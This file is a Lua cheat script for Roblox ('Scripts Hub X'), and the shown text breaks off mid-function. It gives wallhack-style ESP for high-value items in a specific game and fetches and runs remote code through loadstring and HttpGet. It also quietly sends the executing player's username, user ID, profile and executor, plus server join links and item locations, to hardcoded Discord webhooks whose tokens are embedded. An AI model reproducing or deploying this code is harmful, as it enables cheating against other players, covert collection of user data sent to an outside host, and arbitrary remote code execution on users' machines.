-- ================================
-- Scripts Hub X | Official (Fixed Version) + Enhanced ESP with Generation-Based Detection (700k/s+)
-- ================================

-- KEY SYSTEM TOGGLE VARIABLE
local Keysystem = false -- Set to false to skip key system for non-premium users

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- Target Game ID for Animal Logger
local STEAL_A_BRAINROT_ID = 109983668079237

-- MINIMUM GENERATION THRESHOLD (700k/s)
local MIN_GENERATION_THRESHOLD = 700000 -- 700k per second

-- Enhanced tracking system for multiple instances
local loggedAnimals = {}
local animalCounts = {} -- Track counts per animal type
local espObjects = {} -- Changed to support multiple instances
local espEnabled = true
local espCounter = 0 -- Unique ID generator for ESP

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

-- Updated Key System Loader for Randomized API
local function loadKeySystem()
    print("🔑 Loading randomized key system for non-premium user...")
    
    local success, keySystemModule = pcall(function()
        -- Use the updated key system with randomized API support
        local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
        return loadstring(script)()
    end)
    
    if not success then
        warn("❌ Failed to load key system: " .. tostring(keySystemModule))
        return false
    end
    
    -- Check if user already has valid key (this will also validate with API)
    print("🔍 Checking for existing valid key...")
    if keySystemModule.CheckExistingKey() then
        print("✅ Valid key found and verified with API, skipping key system UI")
        return true
    end
    
    print("🔓 No valid key found, showing key system UI...")
    
    -- Show key system UI
    keySystemModule.ShowKeySystem()
    
    -- Wait for key verification with progress updates
    local maxWait = 300 -- 5 minutes timeout
    local waited = 0
    local lastUpdate = 0
    
    while not keySystemModule.IsKeyVerified() and waited < maxWait do
        task.wait(1)
        waited = waited + 1
        
        -- Show progress every 30 seconds
        if waited - lastUpdate >= 30 then
            lastUpdate = waited
            local remainingMinutes = math.ceil((maxWait - waited) / 60)
            print("⏰ Key verification timeout in " .. remainingMinutes .. " minutes...")
        end
    end
    
    if keySystemModule.IsKeyVerified() then
        print("✅ Key verified successfully with randomized API")
        return true
    else
        print("❌ Key verification timeout or failed")
        return false
    end
end

-- Webhook URLs
local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
local webhookUrll = "https://discord.com/api/webhooks/1403702581104218153/k_yKYW6971_qADkSO6iuOjj7AIaXIfQuVcIs0mZIpNWJAc_cORIf0ieSDBlN8zibbHi-"

-- ================================
-- ENHANCED PRICE PARSING FUNCTIONS (FROM STEAL-A-BRAINROT.LUA)
-- ================================

-- Enhanced parsePrice function that handles the price format correctly
local function parsePrice(priceText)
    if not priceText or priceText == "" or priceText == "N/A" then
        return 0
    end
    
    -- Remove common formatting and convert to uppercase for consistency
    local cleanPrice = priceText:gsub("[,$]", ""):upper()
    
    -- Extract the number part (including decimals)
    local number = tonumber(cleanPrice:match("%d*%.?%d+"))
    if not number then return 0 end
    
    -- Handle abbreviations (both uppercase and lowercase)
    if cleanPrice:find("T") then
        return number * 1000000000000  -- Trillion
    elseif cleanPrice:find("B") then
        return number * 1000000000     -- Billion
    elseif cleanPrice:find("M") then
        return number * 1000000        -- Million
    elseif cleanPrice:find("K") then
        return number * 1000           -- Thousand
    elseif cleanPrice:find("S") then
        return number                  -- Just the number (seconds/base)
    end
    
    return number
end

-- ================================
-- ENHANCED ESP FUNCTIONS WITH GENERATION-BASED DETECTION
-- ================================

-- Function to find animal data from podium with generation check
local function getAnimalDataFromPodium(plotName, podiumNumber)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    
    local targetPlot = plots:FindFirstChild(plotName)
    if not targetPlot then return nil end
    
    local animalPodiums = targetPlot:FindFirstChild("AnimalPodiums")
    if not animalPodiums then return nil end
    
    local podium = animalPodiums:FindFirstChild(tostring(podiumNumber))
    if not podium then return nil end
    
    local base = podium:FindFirstChild("Base")
    if not base then return nil end
    
    local spawn = base:FindFirstChild("Spawn")
    if not spawn then return nil end
    
    local attachment = spawn:FindFirstChild("Attachment")
    if not attachment then return nil end
    
    local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
    if not animalOverhead then return nil end
    
    local priceLabel = animalOverhead:FindFirstChild("Generation")
    local rarityLabel = animalOverhead:FindFirstChild("Rarity")
    local mutationLabel = animalOverhead:FindFirstChild("Mutation")
    
    if not priceLabel or not priceLabel.Text or priceLabel.Text == "" or priceLabel.Text == "N/A" then
        return nil
    end
    
    local priceValue = parsePrice(priceLabel.Text)
    
    return {
        price = priceLabel.Text,
        priceValue = priceValue,
        rarity = rarityLabel and rarityLabel.Text or "Unknown",
        mutation = mutationLabel and mutationLabel.Text or "None",
        podiumNumber = podiumNumber,
        plotName = plotName
    }
end

-- Function to scan all plots for high-generation brainrots (700k/s+)
local function scanPlotsForHighGenerationBrainrots()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then 
        print("⚠ Plots folder not found in workspace")
        return {}
    end
    
    local foundAnimals = {}
    
    print("🔍 Scanning all plots for brainrots with 700k/s+ generation...")
    
    -- Use the same method as steal-a-brainrot.lua to iterate through plots
    for _, plot in pairs(plots:GetChildren()) do
        if plot:IsA("Model") or plot:IsA("Folder") then
            local plotName = plot.Name
            
            -- Check if this plot has AnimalPodiums
            local animalPodiums = plot:FindFirstChild("AnimalPodiums")
            if animalPodiums then
                -- Check podiums 1-30 (ignore if number doesn't exist)
                for i = 1, 30 do
                    local podium = animalPodiums:FindFirstChild(tostring(i))
                    if podium then
                        local base = podium:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local attachment = spawn:FindFirstChild("Attachment")
                                if attachment then
                                    local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
                                    if animalOverhead then
                                        local priceLabel = animalOverhead:FindFirstChild("Generation")
                                        if priceLabel and priceLabel.Text and priceLabel.Text ~= "" and priceLabel.Text ~= "N/A" then
                                            local priceValue = parsePrice(priceLabel.Text)
                                            
                                            -- Check if generation meets threshold (700k/s+)
                                            if priceValue >= MIN_GENERATION_THRESHOLD then
                                                -- Get complete animal data
                                                local animalData = getAnimalDataFromPodium(plotName, i)
                                                if animalData then
                                                    -- Check if the decorations part exists for teleportation/ESP
                                                    local decorations = base:FindFirstChild("Decorations")
                                                    if decorations then
                                                        local teleportPart = decorations:FindFirstChild("Part")
                                                        if teleportPart then
                                                            local animalId = plotName .. "_podium_" .. i .. "_" .. priceValue
                                                            
                                                            -- Only log if we haven't logged this specific instance before
                                                            if not loggedAnimals[animalId] then
                                                                print("💎 High-generation brainrot found: " .. priceLabel.Text .. " (" .. priceValue .. ") in plot " .. plotName .. " podium " .. i)
                                                                
                                                                table.insert(foundAnimals, {
                                                                    plotName = plotName,
                                                                    podiumNumber = i,
                                                                    price = animalData.price,
                                                                    priceValue = animalData.priceValue,
                                                                    rarity = animalData.rarity,
                                                                    mutation = animalData.mutation,
                                                                    teleportPart = teleportPart,
                                                                    position = teleportPart.Position,
                                                                    animalId = animalId,
                                                                    object = teleportPart -- For ESP
                                                                })
                                                                
                                                                loggedAnimals[animalId] = true
                                                                
                                                                -- Create ESP immediately
                                                                createESP(teleportPart, "High Gen Brainrot", plotName, animalData)
                                                            end
                                                        else
                                                            warn("⚠ Teleport part not found in decorations for podium " .. i .. " in plot " .. plotName)
                                                        end
                                                    else
                                                        warn("⚠ Decorations not found for podium " .. i .. " in plot " .. plotName)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    print("🏆 Found " .. #foundAnimals .. " high-generation brainrots (700k/s+)")
    return foundAnimals
end

-- Create ESP for a single object with generation data
local function createESP(object, animalName, plotName, animalData)
    if not object or not object.Parent then return end
    
    -- Generate unique ESP ID for multiple instances
    espCounter = espCounter + 1
    local espId = animalName .. "_" .. espCounter .. "_" .. tostring(object)
    
    -- Prevent duplicate ESP for the same object
    local existingESP = false
    for id, espData in pairs(espObjects) do
        if espData.object == object then
            existingESP = true
            break
        end
    end
    
    if existingESP then return end
    
    -- Create ESP container
    local espContainer = {}
    
    -- Function to create clean highlight effect
    local function createHighlight()
        local highlight = Instance.new("Highlight")
        highlight.Parent = object
        highlight.FillColor = Color3.fromRGB(255, 215, 0) -- Gold color for high value
        highlight.OutlineColor = Color3.fromRGB(255, 255, 0) -- Bright yellow
        highlight.FillTransparency = 0.7
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = object
        
        return highlight
    end
    
    -- Function to create enhanced name label with generation, rarity, and mutation
    local function createNameLabel()
        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Parent = object
        billboardGui.Size = UDim2.new(0, 200, 0, 90) -- Larger size to accommodate all data
        billboardGui.StudsOffset = Vector3.new(0, 8, 0) -- Position above object
        billboardGui.AlwaysOnTop = true
        
        -- Main container frame
        local containerFrame = Instance.new("Frame")
        containerFrame.Parent = billboardGui
        containerFrame.Size = UDim2.new(1, 0, 1, 0)
        containerFrame.BackgroundTransparency = 1
        
        -- Mutation text (above animal name, super small)
        local mutationLabel = Instance.new("TextLabel")
        mutationLabel.Parent = containerFrame
        mutationLabel.Size = UDim2.new(1, 0, 0.15, 0)
        mutationLabel.Position = UDim2.new(0, 0, 0, 0)
        mutationLabel.BackgroundTransparency = 1
        mutationLabel.Text = animalData and animalData.mutation or ""
        mutationLabel.TextColor3 = Color3.new(1, 1, 1) -- White
        mutationLabel.TextStrokeTransparency = 0
        mutationLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
        mutationLabel.TextScaled = true
        mutationLabel.TextSize = 8 -- Super small
        mutationLabel.Font = Enum.Font.SourceSans
        
        -- Animal name label (HIGH GENERATION BRAINROT)
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Parent = containerFrame
        nameLabel.Size = UDim2.new(1, 0, 0.35, 0)
        nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = "HIGH GEN BRAINROT"
        nameLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- Gold text
        nameLabel.TextStrokeTransparency = 0
        nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
        nameLabel.TextScaled = true
        nameLabel.TextSize = 16
        nameLabel.Font = Enum.Font.SourceSansBold
        
        -- Generation per second label (prominent green)
        local generationLabel = Instance.new("TextLabel")
        generationLabel.Parent = containerFrame
        generationLabel.Size = UDim2.new(1, 0, 0.25, 0)
        generationLabel.Position = UDim2.new(0, 0, 0.5, 0)
        generationLabel.BackgroundTransparency = 1
        generationLabel.Text = animalData and animalData.price or ""
        generationLabel.TextColor3 = Color3.new(0, 1, 0) -- Bright green
        generationLabel.TextStrokeTransparency = 0
        generationLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
        generationLabel.TextScaled = true
        generationLabel.TextSize = 12
        generationLabel.Font = Enum.Font.SourceSansBold
        
        -- Rarity label (under generation, with special colors)
        local rarityLabel = Instance.new("TextLabel")
        rarityLabel.Parent = containerFrame
        rarityLabel.Size = UDim2.new(1, 0, 0.15, 0)
        rarityLabel.Position = UDim2.new(0, 0, 0.75, 0)
        rarityLabel.BackgroundTransparency = 1
        rarityLabel.Text = animalData and animalData.rarity or ""
        rarityLabel.TextScaled = true
        rarityLabel.TextSize = 8 -- Small
        rarityLabel.Font = Enum.Font.SourceSans
        
        -- Special rarity colors
        if animalData and animalData.rarity then
            if animalData.rarity == "Secret" then
                rarityLabel.TextColor3 = Color3.new(0, 0, 0) -- Black
                rarityLabel.TextStrokeTransparency = 0
                rarityLabel.TextStrokeColor3 = Color3.new(1, 1, 1) -- White outline
            elseif animalData.rarity == "Brainrot God" then
                -- RGB color effect for Brainrot God
                spawn(function()
                    local hue = 0
                    while rarityLabel and rarityLabel.Parent do
                        hue = (hue + 0.01) % 1
                        rarityLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
                        wait(0.1)
                    end
                end)
                rarityLabel.TextStrokeTransparency = 0
                rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
            else
                rarityLabel.TextColor3 = Color3.new(1, 1, 1) -- White for other rarities
                rarityLabel.TextStrokeTransparency = 0
                rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
            end
        end
        
        return billboardGui
    end
    
    -- Function to create super thin tracer line
    local function createTracer()
        local camera = workspace.CurrentCamera
        if not camera then return nil end
        
        -- Create tracer line using Beam
        local attachment0 = Instance.new("Attachment")
        attachment0.Parent = camera
        attachment0.Position = Vector3.new(0, 0, 0)
        
        local attachment1 = Instance.new("Attachment")
        attachment1.Parent = object
        if not attachment1.Parent then return nil end
        
        local beam = Instance.new("Beam")
        beam.Parent = workspace
        beam.Attachment0 = attachment0
        beam.Attachment1 = attachment1
        beam.Width0 = 2.5 -- Super thin start
        beam.Width1 = 2.5 -- Super thin end
        beam.Color = ColorSequence.new(Color3.fromRGB(255, 215, 0)) -- Gold color
        beam.Transparency = NumberSequence.new(0) -- Semi-transparent
        beam.FaceCamera = true
        
        return {beam = beam, attachment0 = attachment0, attachment1 = attachment1}
    end
    
    -- Create ESP components
    local highlight = createHighlight()
    local nameLabel = createNameLabel()
    local tracer = createTracer()
    
    -- Store ESP components
    espContainer.highlight = highlight
    espContainer.nameLabel = nameLabel
    espContainer.tracer = tracer
    espContainer.object = object
    espContainer.animalName = animalName
    espContainer.plotName = plotName
    espContainer.animalData = animalData
    
    espObjects[espId] = espContainer
    
    -- Clean up if object is destroyed
    object.AncestryChanged:Connect(function()
        if not object.Parent then
            if espObjects[espId] then
                if espObjects[espId].highlight then
                    espObjects[espId].highlight:Destroy()
                end
                if espObjects[espId].nameLabel then
                    espObjects[espId].nameLabel:Destroy()
                end
                if espObjects[espId].tracer then
                    if espObjects[espId].tracer.beam then
                        espObjects[espId].tracer.beam:Destroy()
                    end
                    if espObjects[espId].tracer.attachment0 then
                        espObjects[espId].tracer.attachment0:Destroy()
                    end
                    if espObjects[espId].tracer.attachment1 then
                        espObjects[espId].tracer.attachment1:Destroy()
                    end
                end
                espObjects[espId] = nil
            end
        end
    end)
    
    return espId
end

-- Apply ESP to all currently detected high-generation brainrots
local function applyESPToExistingHighGenBrainrots()
    local foundAnimals = scanPlotsForHighGenerationBrainrots()
    
    -- Count animals by type for display
    animalCounts = {}
    for _, animal in pairs(foundAnimals) do
        local displayName = "High Gen (" .. animal.price .. ")"
        animalCounts[displayName] = (animalCounts[displayName] or 0) + 1
    end
    
    print("✅ ESP applied to " .. #foundAnimals .. " high-generation brainrots")
end

-- ================================
-- ENHANCED ANIMAL LOGGING FUNCTIONS WITH GENERATION DETECTION
-- ================================

-- Enhanced logging with generation display
local function sendHighGenerationAnimalLog(animals)
    if #animals == 0 then return end
    
    pcall(function()
        local placeId = tostring(game.PlaceId)
        local jobId = game.JobId or "Unknown"
        
        -- Create consolidated animal list with generation info
        local animalList = ""
        
        -- Sort animals by generation value (highest first)
        table.sort(animals, function(a, b)
            return (a.priceValue or 0) > (b.priceValue or 0)
        end)
        
        for i, animal in ipairs(animals) do
            animalList = animalList .. "**Plot:** " .. animal.plotName .. " | **Slot:** " .. animal.podiumNumber
            animalList = animalList .. "\n**Generation:** " .. animal.price .. " (" .. tostring(animal.priceValue) .. "/s)"
            animalList = animalList .. "\n**Rarity:** " .. (animal.rarity or "Unknown")
            if animal.mutation and animal.mutation ~= "None" and animal.mutation ~= "" then
                animalList = animalList .. "\n**Mutation:** " .. animal.mutation
            end
    
            -- Add separator if it's not the last item
            if i < #animals then
                animalList = animalList .. "\n\n"
            end
		end
        
        -- Create join script
        local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)'
        local playerCount = #Players:GetPlayers()
        
        local totalAnimals = #animals
        
        -- Calculate total generation per second
        local totalGeneration = 0
        for _, animal in pairs(animals) do
            totalGeneration = totalGeneration + (animal.priceValue or 0)
        end
			
        local send_data = {
            ["username"] = "Scripts Hub X | Official - High Gen Notifyer",
            ["avatar_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png",
            ["embeds"] = {
                {
                    ["title"] = "💎 HIGH GENERATION BRAINROT DETECTED (700k/s+) 💎",
                    ["description"] = "**Total:** " .. totalAnimals .. " high-gen brainrot(s) found\n**Combined Generation:** " .. tostring(totalGeneration) .. "/s",
                    ["color"] = 16766720, -- Gold color
                    ["fields"] = {
                        {["name"] = "Brainrots Found", ["value"] = animalList, ["inline"] = false},
				      		{["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
                        {["name"] = "Players", ["value"] = playerCount .. "/8", ["inline"] = true},
                        {["name"] = "Minimum Threshold", ["value"] = tostring(MIN_GENERATION_THRESHOLD) .. "/s", ["inline"] = true},
			      			{["name"] = "Join Script", ["value"] = joinScript, ["inline"] = false},
                        {["name"] = "Join Link", ["value"] = '[Join Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
                    },
                    ["footer"] = {
                        ["text"] = "High-Gen Brainrots Notifyer • Scripts Hub X | Official",
                        ["icon_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png"
                    }
                }
            }
        }
        
        local headers = {["Content-Type"] = "application/json"}
        pcall(function()
            if request and type(request) == "function" then
                request({
                    Url = webhookUrll,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(send_data)
                })
            elseif http_request and type(http_request) == "function" then
                http_request({
                    Url = webhookUrll,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(send_data)
                })
            end
        end)
        
        print("📤 Sent webhook notification for " .. totalAnimals .. " high-generation brainrots")
    end)
end

local function checkForHighGenerationAnimals()
    local highGenAnimals = scanPlotsForHighGenerationBrainrots()
    
    -- Send to webhook if high-gen animals found
    if #highGenAnimals > 0 then
        sendHighGenerationAnimalLog(highGenAnimals)
    end
    
    return highGenAnimals
end

-- ================================
-- REMAINING ORIGINAL FUNCTIONS
-- ================================

-- Notification function
local function notify(title, text)
	spawn(function()
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- Executor detection function
local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif getgenv and getgenv().scriptware then
		return "Script-Ware"
	elseif getgenv and getgenv().protosmasher then
		return "ProtoSmasher"
	elseif getgenv and getgenv().sirhurt then
		return "SirHurt"
	elseif getgenv and getgenv().sentinellib then
		return "Sentinel"
	elseif getgenv and getgenv().vega then
		return "Vega X"
	elseif getgenv and getgenv().oxygen then
		return "Oxygen U"
	elseif getgenv and getgenv().comet then
		return "Comet"
	elseif getgenv and getgenv().nihon then
		return "Nihon"
	elseif getgenv and getgenv().delta then
		return "Delta"
	elseif getgenv and getgenv().evon then
		return "Evon"
	elseif getgenv and getgenv().electron then
		return "Electron"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

-- Webhook notification function
local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		print("Sending webhook notification")
		
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local userId = toString(player.UserId)
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Official - Logging",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true},
						{["name"] = "Join Script", ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)', ["inline"] = true},
						{["name"] = "Join Link", ["value"] = '[Join To The Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		pcall(function()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			end
		end)
	end)
end

-- Game support check function
local function checkGameSupport()
	print("Checking game support for PlaceID: " .. game.PlaceId)
	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data")
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

-- Game script loading function
local function loadGameScript(scriptUrl)
	print("Loading game script from URL: " .. scriptUrl)
	
	local success, result = pcall(function()
		return loadstring(game:HttpGet(scriptUrl))()
	end)
	
	if success then
		print("✅ Game script loaded and executed successfully")
		return true, nil
	else
		warn("❌ Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

-- User status check function
local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	-- Check blacklist first
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	-- Check owner
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		return "owner"
	end
	
	-- Check staff
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		return "staff"
	end
	
	-- Check premium
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		return "premium"
	end
	
	print("Regular user detected - Key system required")
	return "regular"
end

-- Initialize Enhanced High-Generation Animal Logger for Steal A Brainrot
local function initializeHighGenerationAnimalLogger()
	if game.PlaceId == STEAL_A_BRAINROT_ID then
		print("🎯 Initializing Enhanced High-Generation Brainrot ESP System (700k/s+ threshold)...")
		print("💎 Minimum Generation Threshold: " .. tostring(MIN_GENERATION_THRESHOLD) .. "/s")
		
		-- Initial scan after delay
		task.spawn(function()
			task.wait(3) -- Wait for game to fully load
			checkForHighGenerationAnimals()
			applyESPToExistingHighGenBrainrots() -- Apply ESP to any existing high-gen animals
		end)
		
		-- Monitor for changes in plot structures (new animals or generation changes)
		workspace.DescendantAdded:Connect(function(descendant)
			-- Check if it's related to animal podiums
			if descendant.Name == "AnimalOverhead" or descendant.Name == "Generation" then
				task.wait(2) -- Wait for data to load
				checkForHighGenerationAnimals()
			end
		end)
		
		-- Monitor for changes in existing animals (generation updates)
		workspace.DescendantChanged:Connect(function(descendant, property)
			if descendant.Name == "Generation" and property == "Text" then
				task.wait(1) -- Small delay for data consistency
				checkForHighGenerationAnimals()
			end
		end)
		
		-- Periodic comprehensive scan every 30 seconds to catch any missed animals and update data
		task.spawn(function()
			while true do
				task.wait(30)
				print("🔄 Performing periodic scan for high-generation brainrots...")
				checkForHighGenerationAnimals()
				
				-- Update existing ESP with latest data
				local plots = workspace:FindFirstChild("Plots")
				if plots then
					for espId, espContainer in pairs(espObjects) do
						if espContainer.plotName and espContainer.animalData and espContainer.animalData.podiumNumber then
							local updatedData = getAnimalDataFromPodium(espContainer.plotName, espContainer.animalData.podiumNumber)
							if updatedData and updatedData.priceValue >= MIN_GENERATION_THRESHOLD then
								-- Update ESP data
								espContainer.animalData = updatedData
								
								-- Recreate ESP labels with updated data
								if espContainer.nameLabel then
									espContainer.nameLabel:Destroy()
									
									-- Recreate the billboard with updated information
									local billboardGui = Instance.new("BillboardGui")
									billboardGui.Parent = espContainer.object
									billboardGui.Size = UDim2.new(0, 200, 0, 90)
									billboardGui.StudsOffset = Vector3.new(0, 8, 0)
									billboardGui.AlwaysOnTop = true
									
									local containerFrame = Instance.new("Frame")
									containerFrame.Parent = billboardGui
									containerFrame.Size = UDim2.new(1, 0, 1, 0)
									containerFrame.BackgroundTransparency = 1
									
									-- Mutation label
									local mutationLabel = Instance.new("TextLabel")
									mutationLabel.Parent = containerFrame
									mutationLabel.Size = UDim2.new(1, 0, 0.15, 0)
									mutationLabel.Position = UDim2.new(0, 0, 0, 0)
									mutationLabel.BackgroundTransparency = 1
									mutationLabel.Text = updatedData.mutation or ""
									mutationLabel.TextColor3 = Color3.new(1, 1, 1)
									mutationLabel.TextStrokeTransparency = 0
									mutationLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
									mutationLabel.TextScaled = true
									mutationLabel.TextSize = 8
									mutationLabel.Font = Enum.Font.SourceSans
									
									-- Name label
									local nameLabel = Instance.new("TextLabel")
									nameLabel.Parent = containerFrame
									nameLabel.Size = UDim2.new(1, 0, 0.35, 0)
									nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
									nameLabel.BackgroundTransparency = 1
									nameLabel.Text = "HIGH GEN BRAINROT"
									nameLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
									nameLabel.TextStrokeTransparency = 0
									nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
									nameLabel.TextScaled = true
									nameLabel.TextSize = 16
									nameLabel.Font = Enum.Font.SourceSansBold
									
									-- Generation label
									local generationLabel = Instance.new("TextLabel")
									generationLabel.Parent = containerFrame
									generationLabel.Size = UDim2.new(1, 0, 0.25, 0)
									generationLabel.Position = UDim2.new(0, 0, 0.5, 0)
									generationLabel.BackgroundTransparency = 1
									generationLabel.Text = updatedData.price or ""
									generationLabel.TextColor3 = Color3.new(0, 1, 0)
									generationLabel.TextStrokeTransparency = 0
									generationLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
									generationLabel.TextScaled = true
									generationLabel.TextSize = 12
									generationLabel.Font = Enum.Font.SourceSansBold
									
									-- Rarity label
									local rarityLabel = Instance.new("TextLabel")
									rarityLabel.Parent = containerFrame
									rarityLabel.Size = UDim2.new(1, 0, 0.15, 0)
									rarityLabel.Position = UDim2.new(0, 0, 0.75, 0)
									rarityLabel.BackgroundTransparency = 1
									rarityLabel.Text = updatedData.rarity or ""
									rarityLabel.TextScaled = true
									rarityLabel.TextSize = 8
									rarityLabel.Font = Enum.Font.SourceSans
									
									-- Special rarity colors
									if updatedData.rarity == "Secret" then
										rarityLabel.TextColor3 = Color3.new(0, 0, 0)
										rarityLabel.TextStrokeTransparency = 0
										rarityLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
									elseif updatedData.rarity == "Brainrot God" then
										spawn(function()
											local hue = 0
											while rarityLabel and rarityLabel.Parent do
												hue = (hue + 0.01) % 1
												rarityLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
												wait(0.1)
											end
										end)
										rarityLabel.TextStrokeTransparency = 0
										rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
									else
										rarityLabel.TextColor3 = Color3.new(1, 1, 1)
										rarityLabel.TextStrokeTransparency = 0
										rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
									end
									
									espContainer.nameLabel = billboardGui
								end
							elseif updatedData and updatedData.priceValue < MIN_GENERATION_THRESHOLD then
